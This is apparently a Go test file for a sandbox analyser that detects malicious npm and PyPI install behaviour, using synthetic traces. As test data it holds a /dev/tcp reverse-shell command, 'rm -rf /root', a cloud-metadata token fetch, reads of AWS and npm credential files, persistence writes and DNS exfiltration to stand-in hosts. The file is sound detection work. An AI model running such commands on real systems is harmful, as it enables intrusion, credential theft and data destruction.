package behavior

import (
	"fmt"
	"testing"

	"github.com/joncooper/detonator/internal/verdict"
)

// These tests use hand-built synthetic traces representing general threat
// classes — not copied from any real corpus sample — so the rules are validated
// against the shape of an attack, not memorized indicators.

func rules(sigs []verdict.Signal) map[string]verdict.Severity {
	m := map[string]verdict.Severity{}
	for _, s := range sigs {
		m[s.Rule] = s.Severity
	}
	return m
}

func TestBenignTraceNoSignals(t *testing.T) {
	tr := &Trace{Analysis: map[string]Phase{
		"install": {
			Files:   []FileOp{{Path: "/app/node_modules/foo/index.js", Read: true}, {Path: "/tmp/x", Write: true}},
			Sockets: []Socket{{Address: "8.8.8.8", Port: 53}},
			DNS:     []DNSRecord{{Queries: []DNSQuery{{Hostname: "registry.npmjs.org"}}}},
		},
	}}
	if sigs := Analyze(verdict.NPM, tr); len(sigs) != 0 {
		t.Fatalf("benign trace produced signals: %+v", sigs)
	}
}

func TestCredentialStealerShape(t *testing.T) {
	tr := &Trace{Analysis: map[string]Phase{
		"install": {
			Files: []FileOp{
				{Path: "/root/.aws/credentials", Read: true},
				{Path: "/root/.npmrc", Read: true},
			},
			Commands: []Command{{Command: []string{"sh", "-c", "curl -sf http://169.254.169.254/latest/api/token"}}},
			Sockets:  []Socket{{Address: "169.254.169.254", Port: 80}},
			DNS:      []DNSRecord{{Queries: []DNSQuery{{Hostname: "exfil.example-c2.tld"}}}},
		},
	}}
	got := rules(Analyze(verdict.NPM, tr))
	for _, want := range []string{"sensitive-read:aws-credentials", "sensitive-read:npm-token", "cloud-metadata-access", "unknown-domain", "process-spawn", "exfil-chain"} {
		if _, ok := got[want]; !ok {
			t.Errorf("missing rule %q; got %+v", want, got)
		}
	}
	if got["cloud-metadata-access"] != verdict.SevCritical || got["exfil-chain"] != verdict.SevCritical {
		t.Errorf("metadata/exfil should be critical: %+v", got)
	}
}

func TestEtcPasswdIsInfoNotHigh(t *testing.T) {
	// /etc/passwd and /etc/shadow are read by benign installs in this sandbox
	// (confirmed by the benign baseline), so they are informational, not a
	// verdict-driving signal.
	tr := &Trace{Analysis: map[string]Phase{"import": {Files: []FileOp{
		{Path: "/etc/passwd", Read: true}, {Path: "/etc/shadow", Read: true},
	}}}}
	got := rules(Analyze(verdict.NPM, tr))
	if got["sensitive-read:etc-passwd"] != verdict.SevInfo || got["sensitive-read:etc-shadow"] != verdict.SevInfo {
		t.Fatalf("etc-passwd/shadow should be info, got %v", got)
	}
	// A lone /etc/passwd read must NOT trigger the exfil chain.
	if _, ok := got["exfil-chain"]; ok {
		t.Fatal("lone /etc/passwd read wrongly triggered exfil-chain")
	}
}

func TestBenignPackageManagerNoiseNotFlagged(t *testing.T) {
	// Reproduce the benign-baseline shape: npm reads ~/.npmrc, the sandbox reads
	// /etc/passwd+shadow, and npm spawns `sh -c` to run a (harmless) script.
	// None of this may produce a blocking/quarantining signal.
	tr := &Trace{Analysis: map[string]Phase{"install": {
		Files:    []FileOp{{Path: "/root/.npmrc", Read: true}, {Path: "/etc/passwd", Read: true}, {Path: "/etc/shadow", Read: true}},
		Commands: []Command{{Command: []string{"sh", "-c", "node build.js"}}},
	}}}
	for _, s := range Analyze(verdict.NPM, tr) {
		if s.Severity == verdict.SevHigh || s.Severity == verdict.SevCritical || s.Severity == verdict.SevMedium {
			t.Fatalf("benign package-manager noise produced an actionable signal: %+v", s)
		}
	}
}

func TestSystemConfigReadsNotFlagged(t *testing.T) {
	// npm reads its own config on every install; benign packages must not be
	// flagged for it. Only home-dir credential dotfiles count.
	tr := &Trace{Analysis: map[string]Phase{"install": {Files: []FileOp{
		{Path: "/usr/lib/node_modules/npm/npmrc", Read: true},
		{Path: "/usr/etc/npmrc", Read: true},
		{Path: "/app/.npmrc", Read: true},
	}}}}
	if sigs := Analyze(verdict.NPM, tr); len(sigs) != 0 {
		t.Fatalf("system/project config reads wrongly flagged: %+v", sigs)
	}
	// But a home-dir .npmrc (holds the auth token) IS flagged.
	home := &Trace{Analysis: map[string]Phase{"install": {Files: []FileOp{{Path: "/root/.npmrc", Read: true}}}}}
	if _, ok := rules(Analyze(verdict.NPM, home))["sensitive-read:npm-token"]; !ok {
		t.Fatal("home .npmrc should be flagged")
	}
}

func TestPersistenceWrite(t *testing.T) {
	for _, path := range []string{"/etc/cron.d/x", "/root/.bashrc", "/root/.ssh/authorized_keys", "/etc/systemd/system/x.service", "/etc/ld.so.preload"} {
		tr := &Trace{Analysis: map[string]Phase{"install": {Files: []FileOp{{Path: path, Write: true}}}}}
		if rules(Analyze(verdict.NPM, tr))["persistence-write"] != verdict.SevCritical {
			t.Errorf("persistence-write not flagged for %s", path)
		}
	}
}

func TestReverseShellAndDestruction(t *testing.T) {
	rs := &Trace{Analysis: map[string]Phase{"install": {Commands: []Command{{Command: []string{"bash", "-c", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"}}}}}}
	if rules(Analyze(verdict.NPM, rs))["reverse-shell"] != verdict.SevCritical {
		t.Fatal("reverse-shell not flagged")
	}
	rm := &Trace{Analysis: map[string]Phase{"install": {Commands: []Command{{Command: []string{"sh", "-c", "rm -rf /root"}}}}}}
	if rules(Analyze(verdict.NPM, rm))["data-destruction"] != verdict.SevCritical {
		t.Fatal("rm -rf /root not flagged as data-destruction")
	}
}

func TestDropAndExecute(t *testing.T) {
	// The dropped file is written AND read (write-then-read-to-exec), exactly as
	// the sandbox records it — file ops must be handled independently, not as a
	// mutually-exclusive switch.
	tr := &Trace{Analysis: map[string]Phase{"install": {
		Files:    []FileOp{{Path: "/tmp/stage2.sh", Read: true, Write: true}},
		Commands: []Command{{Command: []string{"sh", "/tmp/stage2.sh"}}},
	}}}
	if rules(Analyze(verdict.NPM, tr))["download-and-execute"] != verdict.SevCritical {
		t.Fatal("drop-and-execute not flagged (read+write dropped file)")
	}
}

func TestMiningPoolEgress(t *testing.T) {
	tr := &Trace{Analysis: map[string]Phase{"execute": {Sockets: []Socket{{Address: "45.9.148.1", Port: 3333}}}}}
	if rules(Analyze(verdict.NPM, tr))["mining-pool-egress"] != verdict.SevHigh {
		t.Fatal("mining-pool port not flagged")
	}
}

func TestHarnessArgvDoesNotTriggerDropAndExecute(t *testing.T) {
	// Regression: benign acorn/esbuild/resolve/jsesc all hard-BLOCKED at CRITICAL.
	// npm stages the package's own bin script under /root/.npm/_cacache/tmp/ (home
	// scoped, extensionless -> reads as an executable drop) while the analysis
	// harness passes the bare package name in its own argv. Basename matching made
	// those collide. A bare word is not execution of a file.
	tr := &Trace{Analysis: map[string]Phase{"install": {
		Files: []FileOp{
			{Path: "/root/.npm/_cacache/tmp/nMbJV1/bin/acorn", Write: true},
			{Path: "/app/node_modules/acorn/bin/acorn", Write: true},
		},
		Commands: []Command{{Command: []string{
			"node", "/usr/local/bin/analyze-node.js", "--local", "/acorn.tgz", "install", "acorn"}}},
	}}}
	if rules(Analyze(verdict.NPM, tr))["download-and-execute"] != "" {
		t.Fatal("harness argv / npm cache collision wrongly flagged as download-and-execute")
	}
	// A genuine dropper references the PATH it wrote, and still fires.
	real := &Trace{Analysis: map[string]Phase{"install": {
		Files:    []FileOp{{Path: "/tmp/stage2.sh", Write: true, Read: true}},
		Commands: []Command{{Command: []string{"sh", "/tmp/stage2.sh"}}},
	}}}
	if rules(Analyze(verdict.NPM, real))["download-and-execute"] != verdict.SevCritical {
		t.Fatal("genuine drop-and-execute no longer flagged")
	}
}

func TestPackageManagerChurnNotDestruction(t *testing.T) {
	// Regression: a benign `pip install requests` replaced an older certifi and
	// deleted >25 files under site-packages, scoring data-destruction CRITICAL.
	// Package managers rearranging their own install tree is not destruction.
	var churn []FileOp
	for i := 0; i < 60; i++ {
		churn = append(churn, FileOp{
			Path:   fmt.Sprintf("/app/.pyenv/lib/python3.12/site-packages/certifi-2022.12.7.dist-info/f%d", i),
			Delete: true,
		})
	}
	tr := &Trace{Analysis: map[string]Phase{"install": {Files: churn}}}
	if rules(Analyze(verdict.PyPI, tr))["data-destruction"] != "" {
		t.Fatal("package-manager install churn wrongly flagged as data-destruction")
	}
	// A real wiper deleting user data still fires.
	var wipe []FileOp
	for i := 0; i < 40; i++ {
		wipe = append(wipe, FileOp{Path: fmt.Sprintf("/root/documents/file%d.txt", i), Delete: true})
	}
	real := &Trace{Analysis: map[string]Phase{"execute": {Files: wipe}}}
	if rules(Analyze(verdict.NPM, real))["data-destruction"] != verdict.SevCritical {
		t.Fatal("genuine mass deletion of user data no longer flagged")
	}
}

func TestHardcodedIPEgress(t *testing.T) {
	// Raw-IP connect-back with no DNS — the elf-stats-* reverse-shell shape that the
	// DNS-based unknown-domain rule can't see.
	tr := &Trace{Analysis: map[string]Phase{"import": {Sockets: []Socket{{Address: "161.97.148.123", Port: 9000}}}}}
	if rules(Analyze(verdict.NPM, tr))["hardcoded-ip-egress"] != verdict.SevHigh {
		t.Fatalf("hardcoded raw-IP connect-back not flagged high: %+v", Analyze(verdict.NPM, tr))
	}
	// Precision: a public IP resolved FROM a hostname is judged by the DNS path, not here.
	resolved := &Trace{Analysis: map[string]Phase{"install": {Sockets: []Socket{{Address: "93.184.216.34", Port: 443, Hostnames: []string{"api.example.com"}}}}}}
	if rules(Analyze(verdict.NPM, resolved))["hardcoded-ip-egress"] != "" {
		t.Fatal("domain-resolved connection wrongly flagged as hardcoded-ip-egress")
	}
	// Precision: private/loopback/CGNAT/TEST-NET(sinkhole)/public-DNS must not fire.
	for _, addr := range []string{"10.0.0.5", "192.168.1.1", "127.0.0.1", "100.64.0.1", "192.0.2.1", "8.8.8.8", "1.1.1.1"} {
		benign := &Trace{Analysis: map[string]Phase{"install": {Sockets: []Socket{{Address: addr, Port: 443}}}}}
		if rules(Analyze(verdict.NPM, benign))["hardcoded-ip-egress"] != "" {
			t.Fatalf("non-routable/benign IP %s wrongly flagged as hardcoded-ip-egress", addr)
		}
	}
	// Exfil chain: a credential read + raw-IP egress escalates to critical.
	chain := &Trace{Analysis: map[string]Phase{"install": {
		Files:   []FileOp{{Path: "/root/.aws/credentials", Read: true}},
		Sockets: []Socket{{Address: "161.97.148.123", Port: 9000}},
	}}}
	if rules(Analyze(verdict.NPM, chain))["exfil-chain"] != verdict.SevCritical {
		t.Fatal("cred-read + raw-IP egress not escalated to exfil-chain")
	}
}

func TestTokenReadExfilChain(t *testing.T) {
	// .npmrc read + UNKNOWN egress (raw-IP C2) -> exfil-chain (registry-token theft).
	steal := &Trace{Analysis: map[string]Phase{"install": {
		Files:   []FileOp{{Path: "/root/.npmrc", Read: true}},
		Sockets: []Socket{{Address: "185.62.188.9", Port: 443}},
	}}}
	if rules(Analyze(verdict.NPM, steal))["exfil-chain"] != verdict.SevCritical {
		t.Fatal(".npmrc read + unknown egress not escalated to exfil-chain")
	}
	// Precision: a baseline npm install reads .npmrc but only reaches the registry —
	// this is EVERY install and must NOT fire exfil-chain.
	benign := &Trace{Analysis: map[string]Phase{"install": {
		Files:   []FileOp{{Path: "/root/.npmrc", Read: true}, {Path: "/usr/lib/node_modules/npm/npmrc", Read: true}},
		Sockets: []Socket{{Address: "104.16.2.34", Port: 443, Hostnames: []string{"registry.npmjs.org"}}},
		DNS:     []DNSRecord{{Queries: []DNSQuery{{Hostname: "registry.npmjs.org"}}}},
	}}}
	if rules(Analyze(verdict.NPM, benign))["exfil-chain"] != "" {
		t.Fatal("baseline .npmrc read + registry-only egress wrongly flagged as exfil-chain")
	}
	// The standalone .npmrc read stays Info (no verdict effect on its own).
	if rules(Analyze(verdict.NPM, benign))["sensitive-read:npm-token"] != verdict.SevInfo {
		t.Fatal(".npmrc read should remain SevInfo standalone")
	}
}

func TestReconBurstAndDNSExfil(t *testing.T) {
	recon := &Trace{Analysis: map[string]Phase{"install": {Commands: []Command{
		{Command: []string{"uname", "-a"}}, {Command: []string{"whoami"}}, {Command: []string{"hostname"}},
	}}}}
	if rules(Analyze(verdict.NPM, recon))["recon-burst"] != verdict.SevMedium {
		t.Fatal("recon-burst not flagged for 3 distinct tools")
	}
	var qs []DNSQuery
	for _, s := range []string{"YWJjZGVmZ2hpamtsbW5vcHFyc3R1", "MHhkZWFkYmVlZmNhZmViYWJlMDAx", "cXdlcnR5dWlvcGFzZGZnaGprbHo"} {
		qs = append(qs, DNSQuery{Hostname: s + ".exfil.example"})
	}
	dx := &Trace{Analysis: map[string]Phase{"install": {DNS: []DNSRecord{{Queries: qs}}}}}
	if rules(Analyze(verdict.NPM, dx))["dns-exfil"] != verdict.SevHigh {
		t.Fatal("dns-exfil not flagged for encoded-subdomain burst")
	}
}

func TestNativeBuildNotFlagged(t *testing.T) {
	// A benign native build: compiler spawns + writes into its own build dir +
	// one uname to detect the platform. None of it may produce a signal.
	tr := &Trace{Analysis: map[string]Phase{"install": {
		Commands: []Command{
			{Command: []string{"node-gyp", "rebuild"}},
			{Command: []string{"sh", "-c", "make -j4"}},
			{Command: []string{"gcc", "-c", "binding.cc"}},
			{Command: []string{"uname", "-s"}},
		},
		Files: []FileOp{{Path: "/root/.npm/_cacache/tmp/x", Write: true}, {Path: "build/Release/foo.node", Write: true}},
	}}}
	for _, s := range Analyze(verdict.NPM, tr) {
		if s.Severity == verdict.SevHigh || s.Severity == verdict.SevCritical || s.Severity == verdict.SevMedium {
			t.Fatalf("native build produced an actionable signal: %+v", s)
		}
	}
}

func TestKnownRegistryEgressNotFlagged(t *testing.T) {
	tr := &Trace{Analysis: map[string]Phase{"install": {DNS: []DNSRecord{{Queries: []DNSQuery{
		{Hostname: "registry.npmjs.org"}, {Hostname: "files.pythonhosted.org"},
	}}}}}}
	// npm registry must be clean for npm; pythonhosted is unknown for an npm pkg.
	got := rules(Analyze(verdict.NPM, tr))
	if _, ok := got["unknown-domain"]; !ok {
		t.Fatal("pythonhosted should be unknown for an npm package")
	}
	// For pypi, pythonhosted is whitelisted.
	got2 := rules(Analyze(verdict.PyPI, &Trace{Analysis: map[string]Phase{"install": {DNS: []DNSRecord{{Queries: []DNSQuery{{Hostname: "files.pythonhosted.org"}}}}}}}))
	if _, ok := got2["unknown-domain"]; ok {
		t.Fatal("pythonhosted should be whitelisted for pypi")
	}
}
